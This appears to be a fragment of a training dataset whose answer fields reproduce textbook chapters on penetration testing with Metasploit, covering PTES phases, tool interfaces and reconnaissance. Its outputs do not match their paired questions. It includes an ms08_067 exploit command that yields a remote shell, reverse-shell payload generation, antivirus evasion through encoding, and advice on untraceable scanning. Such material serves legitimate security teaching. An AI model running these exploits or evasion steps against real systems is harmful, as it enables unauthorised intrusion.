blocking behavior by initially probing from an expendable IP\naddress that you are willing to have blocked or detected. The same holds true\nwhen you’re testing web applications, where, after a certain threshold, the\nweb application firewalls will block you from making further requests.\nTo remain undetected during these sorts of tests, you can perform your\ninitial scans from IP address ranges that can’t be linked back to you and your\nteam. Typically, organizations with an external presence on the Internet\nexperience attacks every day, and your initial probing will likely be an unde-\ntected part of the background noise.\nNOTE In some cases, it might make sense to run very noisy scans from an entirely different IP\nrange other than the one you will be using for the main attack. This will help you deter-\nmine how well the organization responds to the tools you are using.\nThreat Modeling\nThreat modeling uses the information you acquired in the intelligence-gathering\nphase to identify any existing vulnerabilities on a target system. When perform-\ning threat modeling, you will determine the most effective attack method,\n2 Chapter 1\nthe type of information you are after, and how the organization might be\nattacked. Threat modeling involves looking at an organization as an adversary\nand attempting to exploit weaknesses as an attacker would.\nVulnerability Analysis\nHaving identified the most viable attack methods, you need to consider how\nyou will access the target. During vulnerability analysis, you combine the infor-\nmation that you’ve learned from the prior phases and use it to understand\nwhat attacks might be viable. Among other things, vulnerability analysis takes\ninto account port and vulnerability scans, data gathered by banner grabbing,\nand information collected during intelligence gathering.\nExploitation\nExploitation is probably one of the most glamorous parts of a penetration test,\nyet it is often done with brute force rather than with precision. An exploit\nshould be performed only when you know almost beyond a shadow of a doubt\nthat a particular exploit will be successful. Of course, unforeseen protective\nmeasures might be in place on the target that prevent a particular exploit\nfrom working—but before you trigger a vulnerability, you should know that\nthe system is vulnerable. Blindly firing off a mass onslaught of exploits and\npraying for a shell isn’t productive; it is noisy and provides little if any value\nto you as a penetration tester or to your client. Do your homework first, and\nthen launch well-researched exploits that are likely to succeed.\nPost Exploitation\nThe post exploitation phase begins after you have compromised one or more\nsystems—but you’re not even close to being done yet.\nPost exploitation is a critical component in any penetration test. This is\nwhere you differentiate yourself from the average, run-of-the-mill hacker and\nactually provide valuable information and intelligence from your penetration\ntest. Post exploitation targets specific systems, identifies critical infrastructure,\nand targets information or data that the company values most and that it has\nattempted to secure. When you exploit one system after another, you are try-\ning to demonstrate attacks that would have the greatest business impact.\nWhen attacking systems in post exploitation, you should take the time\nto determine what the various systems do and their different user roles. For\nexample, suppose you compromise a domain infrastructure system and you’re\nrunning as an enterprise administrator or have domain administrative-level\nrights. You might be king of the domain, but what about the systems that\ncommunicate with Active Directory? What about the main financial applica-\ntion that is used to pay employees? Could you compromise that system, and\nthen, on the next pay cycle, have it route all the money out of the company\nto an offshore account? How about the target’s intellectual property?\nThe Absolute Basics of Penetration Testing 3"
  },
  {
    "input": "What are the key considerations when deciding whether to conduct an overt or covert penetration test and how do these tests differ in their approach and objectives?",
    "summary": "Penetration testing involves identifying and exploiting vulnerabilities to improve an organization's security. It requires understanding the system's environment and using both technical skills and creativity to find weaknesses. Reports are crucial for communicating findings and helping the organization fix security issues. Metasploit is a powerful tool used in penetration testing, offering various interfaces and utilities to assist in the process.",
    "output": "Suppose, for example, that your client is a large software development\nshop that ships custom-coded applications to customers for use in manufac-\nturing environments. Can you backdoor their source code and essentially\ncompromise all of their customers? What would that do to harm their brand\ncredibility?\nPost exploitation is one of those tricky scenarios in which you must take\nthe time to learn what information is available to you and then use that infor-\nmation to your benefit. An attacker would generally spend a significant amount\nof time in a compromised system doing the same. Think like a malicious\nattacker—be creative, adapt quickly, and rely on your wits instead of auto-\nmated tools.\nReporting\nReporting is by far the most important element of a penetration test. You will\nuse reports to communicate what you did, how you did it, and, most impor-\ntant, how the organization should fix the vulnerabilities discovered during\nthe penetration test.\nWhen performing a penetration test, you’re working from an attacker’s\npoint of view, something that organizations rarely see. The information you\nobtain during a test is vital to the success of the organization’s information\nsecurity program and in stopping future attacks. As you compile and report\nyour findings, think about how the organization can use your findings to\nraise awareness, remediate the issues discovered, and improve overall security\nrather than just patch the technical vulnerabilities.\nAt a minimum, divide your report into an executive summary, executive\npresentation, and technical findings. The technical findings will be used by\nthe client to remediate security holes, but this is also where the value lies in a\npenetration test. For example, if you find a SQL injection vulnerability in the\nclient’s web-based applications, you might recommend that your client sani-\ntize all user input, leverage parameterized SQL queries, run SQL as a limited\nuser account, and turn on custom error messages.\nAfter the client implements your recommendations and fixes the one\nspecific SQL injection vulnerability, are they really protected from SQL injec-\ntion? No. An underlying problem likely caused the SQL injection vulnerability\nin the first place, such as a failure to ensure that third-party applications are\nsecure. Those will need to be fixed as well.\nTypes of Penetration Tests\nNow that you have a basic understanding of the seven PTES categories, let’s\nexamine the two main types of penetration tests: overt and covert. An overt\npen test, or “white hat” test, occurs with the organization’s full knowledge;\ncovert tests are designed to simulate the actions of an unknown and unan-\nnounced attacker. Both tests offer advantages and disadvantages.\n4 Chapter 1\nOvert Penetration Testing\nUsing overt penetration testing, you work with the organization to identify\npotential security threats, and the organization’s IT or security team shows you\nthe organization’s systems. The one main benefit of an overt test is that you\nhave access to insider knowledge and can launch attacks without fear of\nbeing blocked. A potential downside to overt testing is that overt tests might\nnot effectively test the client’s incident response program or identify how\nwell the security program detects certain attacks. When time is limited and\ncertain PTES steps such as intelligence gathering are out of scope, an overt\ntest may be your best option.\nCovert Penetration Testing\nUnlike overt testing, sanctioned covert penetration testing is designed to sim-\nulate the actions of an attacker and is performed without the knowledge of\nmost of the organization. Covert tests are performed to test the internal\nsecurity team’s ability to detect and respond to an attack.\nCovert tests can be costly and time consuming, and they require more\nskill than overt tests. In the eyes of penetration testers in the security industry,\nthe covert scenario is often preferred because it most closely simulates a true\nattack. Covert attacks rely on your ability to gain information by reconnais-\nsance. Therefore, as a covert tester, you will typically not attempt to find a\nlarge number of vulnerabilities in a target but will simply attempt to find the\neasiest way to gain access to a system, undetected.\nVulnerability Scanners\nVulnerability scanners are automated tools used to identify security flaws\naffecting a given system or application. Vulnerability scanners typically work\nby fingerprinting a target’s operating system (that is, identifying the version\nand type) as well as any services that are running. Once you have fingerprinted\nthe target’s operating system, you use the vulnerability scanner to execute\nspecific checks to determine whether vulnerabilities exist. Of course, these\nchecks are only as good as their creators, and, as with any fully automated\nsolution, they can sometimes miss or misrepresent vulnerabilities on a system.\nMost modern vulnerability scanners do an amazing job of minimizing\nfalse positives, and many organizations use them to identify out-of-date systems\nor potential new exposures that might be exploited by attackers.\nVulnerability scanners play a very important role in penetration testing,\nespecially in the case of overt testing, which allows you to launch multiple\nattacks without having to worry about avoiding detection. The wealth of\nknowledge gleaned from vulnerability scanners can be invaluable, but beware\nof relying on them too heavily. The beauty of a penetration test is that it can’t\nbe automated, and attacking systems successfully requires that you have\nknowledge and skills. In most cases, when you become a skilled penetration\ntester, you will rarely use a vulnerability scanner but will rely on your knowl-\nedge and expertise to compromise a system.\nThe Absolute Basics of Penetration Testing 5\nPulling It All Together\nIf you’re new to penetration testing or haven’t really adopted a formal\nmethodology, study the PTES. As with any experiment, when performing a\npenetration test, ensure that you have a refined and adaptable process that is\nalso repeatable. As a penetration tester, you need to ensure that your intelli-\ngence gathering and vulnerability analysis are as expert as possible, to give\nyou an advantage in adapting to scenarios as they present themselves.\n6 Chapter 1\nM E T A S P L O I T B A S I C S\nWhen you encounter the Metasploit Framework (MSF)\nfor the first time, you might be overwhelmed by its\nmany interfaces, options, utilities, variables, and mod-\nules. In this chapter, we’ll focus on the basics that will\nhelp you make sense of the big picture. We’ll review\nsome basic penetration testing terminology and then\nbriefly cover the various user interfaces that Metasploit has to offer. Meta-\nsploit itself is free, open source software, with many contributors in the secu-\nrity community, but two commercial Metasploit versions are also available.\nWhen first using Metasploit, it’s important not to get hung up on that new-\nest exploit; instead, focus on how Metasploit functions and what commands\nyou used to make the exploit possible.\nTerminology\nThroughout this book, we’ll use various terms that first bear some explana-\ntion. The majority of the following basic terms are defined in the context of\nMetasploit, but they are generally the same throughout the security industry.\nExploit\nAn exploit is the means by which an attacker, or pen tester for that matter, takes\nadvantage of a flaw within a system, an application, or a service. An attacker\nuses an exploit to attack a system in a way that results in a particular desired\noutcome that the developer never intended. Common exploits include buffer\noverflows, web application vulnerabilities (such as SQL injection), and con-\nfiguration errors.\nPayload\nA payload is code that we want the system to execute and that is to be selected\nand delivered by the Framework. For example, a reverse shell is a payload that\ncreates a connection from the target machine back to the attacker as a Win-\ndows command prompt (see Chapter 5), whereas a bind shell is a payload that\n“binds” a command prompt to a listening port on the target machine, which\nthe attacker can then connect. A payload could also be something as simple as\na few commands to be executed on the target operating system.\nShellcode\nShellcode is a set of instructions used as a payload when exploitation occurs.\nShellcode is typically written in assembly language. In most cases, a command\nshell or a Meterpreter shell will be provided after the series of instructions\nhave been performed by the target machine, hence the name.\nModule\nA module in the context of this book is a piece of software that can be used by\nthe Metasploit Framework. At times, you may require the use of an exploit\nmodule, a software component that conducts the attack. Other times, an\nauxiliary module may be required to perform an action such as scanning or\nsystem enumeration. These interchangeable modules are the core of what\nmakes the Framework so powerful.\nListener\nA listener is a component within Metasploit that waits for an incoming connection\nof some sort. For example, after the target machine has been exploited, it may\ncall the attacking machine over the Internet. The listener handles that connec-\ntion, waiting on the attacking machine to be contacted by the exploited system.\nMetasploit Interfaces\nMetasploit offers more than one interface to its underlying functionality,\nincluding console, command line, and graphical interfaces. In addition to\nthese interfaces, utilities provide direct access to functions that are normally\ninternal to the Metasploit Framework. These utilities can be invaluable for\nexploit development and situations for which you do not need the flexibility\nof the entire Framework.\n8 Chapter 2\nMSFconsole\nMsfconsole is by far the most popular part of the Metasploit Framework,\nandfor good reason. It is one of the most flexible, feature-rich, and well-\nsupported tools within the Framework. Msfconsole provides a handy all-in-one\ninterface to almost every option and setting available in the Framework; it’s\nlike a one-stop shop for all of your exploitation dreams. You can use msfconsole\nto do everything, including launching an exploit, loading auxiliary modules,\nperforming enumeration, creating listeners, or running mass exploitation\nagainst an entire network.\nAlthough the Metasploit Framework is constantly changing, a subset of\ncommands remain relatively constant. By mastering the basics of msfconsole,\nyou will be able to keep up with any changes. To illustrate the importance of\nlearning msfconsole, it will be used in nearly every chapter of the book.\nStarting MSFconsole\nTo launch msfconsole, enter msfconsole at the command line:\nroot@bt:/# cd /opt/framework3/msf3/\nroot@bt:/opt/framework/msf3# msfconsole\n< metasploit >\n------------\n\\ ,__,\n\\ (oo)____\n(__) )\\\n||--|| *\nmsf >\nTo access msfconsole’s help files, enter help followed by the command\nwhich you are interested in. In the next example, we are looking for help\nfor the command connect, which allows us to communicate with a host. The\nresulting documentation lists usage, a description of the tool, and the various\noption flags.\nmsf > help connect\nWe’ll explore MSFConsole in greater depth in the chapters that follow.\nMSFcli\nMsfcli and msfconsole take very different approaches to providing access to the\nFramework. Where msfconsole provides an interactive way to access all features\nin a user-friendly manner, msfcli puts the priority on scripting and interpret-\nability with other console-based tools. Instead of providing a unique inter-\npreter to the Framework, msfcli runs directly from the command line, which\nallows you to redirect output from other tools into msfcli and direct msfcli\noutput to other command-line tools. Msfcli also supports the launching of\nexploits and auxiliary modules, and it can be convenient when testing mod-\nules or developing new exploits for the Framework. It is a fantastic tool for\nMetasploit Basics 9\nunique exploitation when you know exactly which exploit and options you\nneed. It is less forgiving than msfconsole, but it offers some basic help (includ-\ning usage and a list of modes) with the command msfcli -h, as shown here:\nroot@bt:/opt/framework3/msf3# msfcli -h\nUsage: /opt/framework3/msf3/msfcli <exploit_name> <option=value> [mode]\n==============================================================================\nMode Description\n---- ---------------\n(H)elp You're looking at it, baby!\n(S)ummary Show information about this module\n(O)ptions Show available options for this module\n(A)dvanced Show available advanced options for this module\n(I)DS Evasion Show available ids evasion options for this module\n(P)ayloads Show available payloads for this module\n(T)argets Show available targets for this exploit module\n(AC)tions Show available actions for this auxiliary module\n(C)heck Run the check routine of the selected module\n(E)xecute Execute the selected module\nroot@bt:/opt/framework3/msf3#\nSample Usage\nLet’s take a look at how you might use msfcli. Don’t worry about the details;\nthese examples are intended to give you a sense of how you might work with\nthis interface.\nWhen you are first learning Metasploit or whenever you get stuck, you\ncan see the options available in a module by appending the letter O to the end\nof the string at whichever point you are stuck. For example, in the following\nlisting, we use the O to see the options available for the ms08_067_netapi module:\nroot@bt:/# msfcli windows/smb/ms08_067_netapi O\n[*] Please wait while we load the module tree...\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOST 0.0.0.0 yes The target address\nRPORT 445 yes Set the SMB service port\nSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)\nYou can see that the module requires three options: RHOST, RPORT, and\nSMPIPE. Now, by adding a P, we can check for available payloads:\nroot@bt:/# msfcli windows/smb/ms08_067_netapi RHOST=192.168.1.155 P\n[*] Please wait while we load the module tree...\n10 Chapter 2\nCompatible payloads\n===================\nName Description\n---- -----------\ngeneric/debug_trap Generate a debug trap in the target process\ngeneric/shell_bind_tcp Listen for a connection and spawn a command shell\nHaving set all the required options for our exploit and selecting a pay-\nload, we can run our exploit by passing the letter E to the end of the msfcli\nargument string, as shown here:\nroot@bt:/# msfcli windows/smb/ms08_067_netapi RHOST=192.168.1.155 PAYLOAD=windows/shell/bind_tcp E\n[*] Please wait while we load the module tree...\n[*] Started bind handler\n[*] Automatically detecting the target...\n[*] Fingerprint: Windows XP Service Pack 2 - lang:English\n[*] Selected Target: Windows XP SP2 English (NX)\n[*] Triggering the vulnerability...\n[*] Sending stage (240 bytes)\n[*] Command shell session 1 opened (192.168.1.101:46025 -> 192.168.1.155:4444)\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\nC:\\WINDOWS\\system32>\nWe’re successful, because we have received a Windows command\nprompt from the remote system.\nArmitage\nThe armitage component of Metasploit is a fully interactive graphical user\ninterface created by Raphael Mudge. This interface is highly impressive,\nfeature rich, and available for free. We won’t be covering armitage in depth,\nbut it is definitely worth mentioning as something to explore. Our goal is\ntoteach the ins and outs of Metasploit, and the GUI is awesome once you\nunderstand how the Framework actually operates.\nRunning Armitage\nTo launch armitage, run the command armitage. During startup, select Start\nMSF, which will allow armitage to connect to your Metasploit instance.\nroot@bt:/opt/framework3/msf3# armitage\nAfter armitage is running, simply click a menu to perform a particular\nattack or access other Metasploit functionality. For example, Figure 2-1 shows\nthe browser (client-side) exploits.\nMetasploit Basics 11\nFigure 2-1: The armitage’s browser exploit menu\nMetasploit Utilities\nHaving covered Metasploit’s three main interfaces, it’s time to cover a few\nutilities. Metasploit’s utilities are direct interfaces to particular features of the\nFramework that can be useful in specific situations, especially in exploit devel-\nopment. We will cover some of the more approachable utilities here and\nintroduce additional ones throughout the book.\nMSFpayload\nThe msfpayload component of Metasploit allows you to generate shellcode,\nexecutables, and much more for use in exploits outside of the Framework.\nShellcode can be generated in many formats including C, Ruby, JavaScript,\nand even Visual Basic for Applications. Each output format will be useful in\nvarious situations. For example, if you are working with a Python-based proof\nof concept, C-style output might be best; if you are working on a browser\nexploit, a JavaScript output format might be best. After you have your desired\noutput, you can easily insert the payload directly into an HTML file to trigger\nthe exploit.\n12 Chapter 2\nTo see which options the utility takes, enter msfpayload -h at the command\nline, as shown here:\nroot@bt:/# msfpayload -h\nAs with msfcli, if you find yourself stuck on the required options for a pay-\nload module, append the letter O on the command line for a list of required\nand optional variables, like so:\nroot@bt:/# msfpayload windows/shell_reverse_tcp O\nWe will dive much deeper into msfpayload as we explore exploit develop-\nment in later chapters.\nMSFencode\nThe shellcode generated by msfpayload is fully functional, but it contains sev-\neral null characters that, when interpreted by many programs, signify the\nend of a string, and this will cause the code to terminate before completion.\nIn other words, those x00s and xffs can break your payload!\nIn addition, shellcode traversing a network in cleartext is likely to be\npicked up by intrusion detection systems (IDSs) and antivirus software. To\naddress this problem, Metasploit’s developers offer msfencode, which helps\nyou to avoid bad characters and evade antivirus and IDSs by encoding the\noriginal payload in a way that does not include “bad” characters. Enter\nmsfencode -h to see a list of msfencode options.\nMetasploit contains a number of different encoders for specific situations.\nSome will be useful when you can use only alphanumeric characters as part\nof a payload, as is the case with many file format exploits or other applications\nthat accept only printable characters as input, while others are great general\npurpose encoders that do well in every situation.\nWhen in doubt, though, you really can’t go wrong with the x86/shikata_\nga_nai encoder, the only encoder with the rank of Excellent, a measure of\nthe reliability and stability of a module. In the context of an encoder, an\nExcellent ranking implies that it is one of the most versatile encoders and\ncan accommodate a greater degree of fine-tuning than other encoders. To\nsee the list of encoders available, append -l to msfencode as shown next. The\npayloads are ranked in order of reliability.\nroot@bt:~# msfencode -l\nNasm Shell\nThe nasm_shell.rb utility can be handy when you’re trying to make sense of\nassembly code, especially if, during exploit development, you need to iden-\ntify the opcodes (the assembly instructions) for a given assembly command.\nMetasploit Basics 13\nFor example, here we run the tool and request the opcodes for the jmp\nesp command, which nasm_shell tells us is FFE4.\nroot@bt:/opt/framework3/msf3/tools# ./nasm_shell.rb\nnasm > jmp esp\n00000000 FFE4 jmp esp\nMetasploit Express and Metasploit Pro\nMetasploit Express and Metasploit Pro are commercial web interfaces to\ntheMetasploit Framework. These utilities provide substantial automation\nand make things easier for new users, while still providing full access to the\nFramework. Both products also provide tools that are unavailable in the\ncommunity editions of the Framework, such as automated password brute\nforcing and automated website attacks. In addition, a nice reporting back-\nend to Metasploit Pro can speed up one of the least popular aspects of\npenetration testing: writing the report.\nAre these tools worth purchasing? Only you can make that choice. The\ncommercial editions of Metasploit are intended for professional penetration\ntesters and can ease many of the more routine aspects of the job, but if the\ntime savings from the automations in these commercial products are useful\nfor you, they might justify the purchase price.\nRemember, however, as you automate your work, that humans are better\nat identifying attack vectors than automated tools.\nWrapping Up\nIn this chapter, you learned a little bit of the basics of the Metasploit Frame-\nwork. As you progress through this book, you will begin using these tools in a\nmuch more advanced capacity. You’ll find a few different ways to accomplish\nthe same tasks using different tools. It will ultimately be up to you to decide\nwhich tool best suits your needs.\nNow that you have the basics under control, let’s move to the next phase\nof the pen testing process: discovery.\n14 Chapter 2"
  },
  {
    "input": "What is the importance of intelligence gathering in a penetration test and what are some key techniques and tools used for passive and active information collection?",
    "summary": "Intelligence gathering is a critical step in penetration testing, involving passive and active methods to collect information about targets without revealing your presence. It helps identify vulnerabilities and potential entry points, requiring careful planning and research. Active scanning tools like Nmap and Metasploit's built-in modules are used to discover open ports, service versions, and other details that can aid in subsequent attacks. Proper documentation and methodical recording of findings are essential for successful penetration testing.",
    "output": "I N T E L L I G E N C E G A T H E R I N G\nIntelligence gathering follows the pre-engagement\nactivities as the second step in a penetration test. Your\ngoals during intelligence gathering should be to gain\naccurate information about your targets without reveal-\ning your presence or your intentions, to learn how the\norganization operates, and to determine the best route\nof entry. If you don’t do a thorough job of intelligence gathering, you may\nmiss vulnerable systems or viable attack vectors. It takes time and patience to\nsort through web pages, perform Google hacking, and map systems thor-\noughly in an attempt to understand the infrastructure of a particular target.\nIntelligence gathering requires careful planning, research, and, most impor-\ntantly, the ability to think like an attacker. At this step, you will attempt to col-\nlect as much information about the target environment as possible. This can\nbe an expansive amount of information, and even the most trivial data gath-\nered during this stage can prove useful later on, so pay attention.\nBefore you begin intelligence gathering, consider how you will record\neverything you do and the results you achieve. You must remember and record\nas many details of your penetration test as possible. Most security professionals\nquickly learn that detailed notes can mean the difference between a successful\nand a failed penetration test. Just as a scientist needs to achieve reproducible\nresults, other experienced penetration testers should be able to reproduce\nyour work using your documentation alone.\nIntelligence gathering is arguably the most important aspect of a pene-\ntration test, because it provides the foundation for all work that follows. When\nrecording your work, be methodical, accurate, and precise. And, as stated\nearlier, be sure that before you fire off your exploits, you have learned all\nthat you can about your target.\nThe excitement for most people comes in exploiting systems and getting\nto root, but you need to learn to walk before you can run.\nWARNING If you follow the procedures in this chapter, you can actually damage your system and\nyour target’s system, so be sure to set up your test environment now. (For help, see\nAppendix A.) Many of the examples in these chapters can be destructive and make a\ntarget system unusable. The activities discussed in this chapter could be considered\nillegal if they are undertaken by someone with bad intentions, so follow the rules and\ndon’t be stupid.\nPassive Information Gathering\nBy using passive and indirect information gathering, you can discover informa-\ntion about targets without touching their systems. For example, you can use\nthese techniques to identify network boundaries, identify the network main-\ntainers, and even learn what operating system and web server software is in\nuse on the target network.\nOpen source intelligence (OSINT) is a form of intelligence collection that\nuses open or readily available information to find, select, and acquire infor-\nmation about a target. Several tools make passive information gathering\nalmost painless, including complex tools such as Yeti and the humble whois.\nIn this section, we’ll explore the process of passive information gathering\nand the tools that you might use for this step.\nImagine, for example, an attack against http://www.secmaniac.net/. Our\ngoal is to determine, as a part of a penetration test, what systems the com-\npany owns and what systems we can attack. Some systems may not be owned\nby the company and could be considered out of scope and unavailable for\nattack.\nwhois Lookups\nLet’s begin by using Back|Track’s whois lookup to find the names of\nsecmaniac.net’s domain servers.\nmsf > whois secmaniac.net\n[*] exec: whois secmaniac.net\n. . . SNIP . . .\n16 Chapter 3\nRegistered through: GoDaddy.com, Inc. (http://www.godaddy.com)\nDomain Name: SECMANIAC.NET\nCreated on: 03-Feb-10\nExpires on: 03-Feb-12\nLast Updated on: 03-Feb-10\n(cid:88)Domain servers in listed order:\nNS57.DOMAINCONTROL.COM\nNS58.DOMAINCONTROL.COM\nWe learn at (cid:88) that the Domain Name System (DNS) servers are hosted\nby DOMAINCONTROL.COM, so this is a good example of systems that would\nnot be included in a penetration test because we would have no authority to\nattack them. In most large organizations, the DNS servers are housed within\nthe company and are viable attack vectors. Zone transfers and similar DNS\nattacks can often be used to learn more about a network from both the inside\nand outside. In this scenario, because DOMAINCONTROL.COM is not owned\nby secmaniac.net, we should not attack these systems and will instead move on\nto a different attack vector.\nNetcraft\nNetcraft (http://searchdns.netcraft.com/) is a web-based tool that we can use to find\nthe IP address of a server hosting a particular website, as shown in Figure 3-1.\nFigure 3-1: Use Netcraft to find the IP address of the server hosting a particular website.\nHaving identified secmaniac.net’s IP address as 75.118.185.142, we do\nanother whois lookup on that IP address:\nmsf > whois 75.118.185.142\n[*] exec: whois 75.118.185.142\nWideOpenWest Finance LLC WIDEOPENWEST (NET-75-118-0-0-1)\n75.118.0.0 - 75.118.255.255\nWIDEOPENWEST OHIO WOW-CL11-1-184-118-75 (NET-75-118-184-0-1)\n75.118.184.0 - 75.118.191.255\nWe see from the whois lookup and a quick search that this IP\n(WIDEOPENWEST) appears to be a legitimate service provider. While\ntheactual subnet range isn’t specifically registered to secmaniac.net or\nsecmaniac.com, we can tell that this site appears to be hosted inside the\nauthor’s home, because the IP block appears to be part of a residential\nrange.\nIntelligence Gathering 17\nNSLookup\nTo get additional server information, we’ll use Back|Track to leverage nslookup, a\ntool built into most operating systems, to find information about secmaniac.net.\nroot@bt:~# nslookup\nset type=mx\n> secmaniac.net\nServer: 172.16.32.2\nAddress: 172.16.32.2#53\nNon-authoritative answer:\nsecmaniac.net mail exchanger = 10 mailstore1.secureserver.net.\nsecmaniac.net mail exchanger = 0 smtp.secureserver.net.\nWe see in this listing that the mail servers are pointing to mailstore1\n.secureserver.net and smtp.secureserver.net. Some quick research on these mail\nservers tells us that this website is hosted by a third party, which would not\nbewithin the scope of our penetration test.\nAt this point, we have gathered some valuable information that we might\nbe able to use against the target later on. Ultimately, however, we have to\nresort to active information gathering techniques to determine the actual\ntarget IP, which is 75.118.185.142.\nNOTE Passive information gathering is an art that is not easily mastered in just a few pages\nof discussion. See the Penetration Testing Execution Standard (PTES; http://\nwww.pentest-standard.org/) for a list of potential ways to perform additional pas-\nsive intelligence gathering.\nActive Information Gathering\nIn active information gathering, we interact directly with a system to learn\nmore about it. We might, for example, conduct port scans for open ports on\nthe target or conduct scans to determine what services are running. Each system\nor running service that we discover gives us another opportunity for exploita-\ntion. But beware: If you get careless while active information gathering, you\nmight be nabbed by an IDS or intrusion prevention system (IPS)—not a\ngood outcome for the covert penetration tester.\nPort Scanning with Nmap\nHaving identified the target IP range with passive information gathering as\nwell as the secmaniac.net target IP address, we can begin to scan for open ports\non the target by port scanning, a process whereby we meticulously connect to\nports on the remote host to identify those that are active. (Obviously, in a\nlarger enterprise, we would have multiple IP ranges and things to attack\ninstead of only one IP.)\nNmap is, by far, the most popular port scanning tool. It integrates with\nMetasploit quite elegantly, storing scan output in a database backend for\n18 Chapter 3\nlater use. Nmap lets you scan hosts to identify the services running on each,\nany of which might offer a way in.\nFor this example, let’s leave secmaniac.net behind and turn to the virtual\nmachine described in Appendix A, with IP address 172.16.32.131. Before we\nget started, take a quick look at the basic nmap syntax by entering nmap from\nthe command line on your Back|Track machine.\nYou’ll see immediately that nmap has a quite a few options, but you’ll use\njust a few of them for the most part.\nOne of our preferred nmap options is -sS. This runs a stealth TCP scan\nthat determines whether a specific TCP-based port is open. Another preferred\noption is -Pn, which tells nmap not to use ping to determine whether a system\nis running; instead, it considers all hosts “alive.” If you’re performing Internet-\nbased penetration tests, you should use this flag, because most networks\ndon’t allow Internet Control Message Protocol (ICMP), which is the protocol\nthat ping uses. If you’re performing this scan internally, you can probably\nignore this flag.\nNow let’s run a quick nmap scan against our Windows XP machine using\nboth the -sS and -Pn flags.\nroot@bt:~# nmap -sS -Pn 172.16.32.131\nNmap scan report for 172.16.32.131\nHost is up (0.00057s latency).\nNot shown: 990 closed ports\nPORT STATE SERVICE\n21/tcp open ftp\n25/tcp open smtp\n80/tcp open http\n135/tcp open msrpc\n139/tcp open netbios-ssn\n443/tcp open https\n445/tcp open microsoft-ds\n1025/tcp open NFS-or-IIS\n1433/tcp open ms-sql-s\n3389/tcp open ms-term-serv\nNmap done: 1 IP address (1 host up) scanned in 14.34 seconds\nAs you can see, nmap reports a list of open ports, along with a description\nof the associated service for each.\nFor more detail, try using the -A flag. This option will attempt advanced\nservice enumeration and banner grabbing, which may give you even more\ndetails about the target system. For example, here’s what we’d see if we were\nto call nmap with the -sS and -A flags, using our same target system:\nroot@bt:~# nmap -Pn -sS -A 172.16.32.131\nNmap scan report for 172.16.32.131\nHost is up (0.0035s latency).\nNot shown: 993 closed ports\nPORT STATE SERVICE VERSION\n135/tcp open msrpc Microsoft Windows RPC\n139/tcp open netbios-ssn\n445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds\nIntelligence Gathering 19\n777/tcp open unknown\n1039/tcp open unknown\n1138/tcp open msrpc Microsoft Windows RPC\n1433/tcp open ms-sql-s Microsoft SQL Server 2005 9.00.1399; RTM\n. . . SNIP . . .\nDevice type: general purpose\nRunning: Microsoft Windows XP|2003\nOS details: Microsoft Windows XP Professional SP2 or Windows Server 2003\nNetwork Distance: 1 hop\nService Info: OS: Windows\nHost script results:\n|_nbstat: NetBIOS name: V-MAC-XP, NetBIOS user: <unknown>, NetBIOS MAC:\n00:0c:29:c9:38:4c (VMware)\n|_smbv2-enabled: Server doesn't support SMBv2 protocol\n| smb-os-discovery:\n| OS: Windows XP (Windows 2000 LAN Manager)\n| Name: WORKGROUP\\V-MAC-XP\nWorking with Databases in Metasploit\nWhen you’re running a complex penetration test with a lot of targets, keep-\ning track of everything can be a challenge. Luckily, Metasploit has you cov-\nered with expansive support for multiple database systems.\nTo ensure that database support is available for your system, you should\nfirst decide which database system you want to run. Metasploit supports\nMySQL and PostgreSQL; because PostgreSQL is the default, we’ll stick with\nit in this discussion.\nFirst, we start the database subsystem using the built-in Back|Track init.d\nscripts.\nroot@bt~# /etc/init.d/postgresql-8.3 start\nAfter PostgreSQL has started, we tell the Framework to connect to the\ndatabase instance. This connection requires a username, password, name of\nthe host on which the database is running, and the database name we want to\nuse. Back|Track’s default PostgreSQL username is postgres with the password\ntoor, but we’ll use msfbook as the database name. Let’s make the connection.\nmsf > db_connect postgres:toor@127.0.0.1/msfbook\nIf this were the first time we connected to the database name, we would\nsee a lot of text output as Metasploit sets up all the necessary tables. Other-\nwise, the command will return to the msfconsole prompt.\nMetasploit provides a number of commands that we can use to interact\nwith the database, as you’ll see throughout this book. (For a complete list,\nenter help.) For now, we’ll use db_status to make sure that we’re connected\ncorrectly.\n20 Chapter 3\nmsf > db_status\n[*] postgresql connected to msfbook\nEverything seems to be set up just fine.\nImporting Nmap Results into Metasploit\nWhen you are working with other team members, with various individuals\nscanning at different times and from different locations, it helps to know\nhow to run nmap on its own and then import its results into the Framework.\nNext, we’ll examine how to import a basic nmap-generated XML export file\n(generated with nmap’s -oX option) into the Framework.\nFirst, we scan the Windows virtual machine using the -oX option to gener-\nate a Subnet1.xml file:\nnmap -Pn -sS -A -oX Subnet1 192.168.1.0/24\nAfter generating the XML file, we use the db_import command to import\nit into our database. We can then verify that the import worked by using the\ndb_hosts command, which lists the systems entries that have been created, as\nshown here:\nmsf > db_connect postgres:toor@127.0.0.1/msf3\nmsf > db_import Subnet1.xml\nmsf > db_hosts -c address\nHosts\n=====\naddress\n-------\n192.168.1.1\n192.168.1.10\n192.168.1.101\n192.168.1.102\n192.168.1.109\n192.168.1.116\n192.168.1.142\n192.168.1.152\n192.168.1.154\n192.168.1.171\n192.168.1.155\n192.168.1.174\n192.168.1.180\n192.168.1.181\n192.168.1.2\n192.168.1.99\nmsf >\nIntelligence Gathering 21\nThis tells us that we’ve successfully imported the output of our nmap\nscans into Metasploit, as evidenced by the IP addresses populated when we\nrun the db_hosts commands.\nAdvanced Nmap Scanning: TCP Idle Scan\nA more advanced nmap scan method, TCP idle scan, allows us to scan a target\nstealthily by spoofing the IP address of another host on the network. For this\ntype of scan to work, we first need to locate an idle host on the network that\nuses incremental IP IDs (which are used to track packet order). When we\ndiscover an idle system that uses incremental IP IDs, the IP IDs become pre-\ndictable, and we can then predict the next ID. However, when spoofing the\naddress of an idle host while scanning a target’s responses from open ports,\nwe can see a break in the predictability of the IP ID sequence, which indi-\ncates that we have discovered an open port. (To learn more about this mod-\nule and IP ID sequences, visit http://www.metasploit.com/modules/auxiliary/\nscanner/ip/ipidseq/.)\nUse the Framework’s scanner/ip/ipidseq module to scan for a host that fits\nthe TCP idle scan requirements, as shown next:\nmsf > use auxiliary/scanner/ip/ipidseq\nmsf auxiliary(ipidseq) > show options\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nGWHOST no The gateway IP 